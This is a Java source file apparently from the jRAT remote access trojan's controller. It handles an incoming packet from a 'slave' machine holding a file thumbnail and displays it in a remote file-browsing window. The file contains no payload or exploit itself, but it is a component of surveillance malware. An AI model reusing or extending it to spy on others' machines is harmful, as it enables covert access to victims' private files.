package se.jrat.controller.packets.incoming;

import java.awt.Graphics;
import java.awt.image.BufferedImage;
import java.io.DataInputStream;

import se.jrat.common.utils.ImageUtils;
import se.jrat.controller.Slave;
import se.jrat.controller.ui.frames.FrameRemoteFiles;

public class Packet59ThumbnailPreview extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String path = slave.readLine();
		int imageSize = dis.readInt();

		int w = 150;
		int h = 100;

		BufferedImage image = new BufferedImage(w, h, BufferedImage.TYPE_INT_RGB);

		Graphics imageGraphics = image.getGraphics();

		byte[] buffer = new byte[imageSize];
		slave.getDataInputStream().readFully(buffer);

		FrameRemoteFiles frame = FrameRemoteFiles.INSTANCES.get(slave);

		if (frame != null) {
			BufferedImage img = ImageUtils.decodeImage(buffer);
			imageGraphics.drawImage(img, 0, 0, w, h, null);
			frame.getThumbPanel().addImage(path, image);
			frame.getThumbPanel().setProgress(frame.getThumbPanel().getProgress() + 1);
		}
	}

}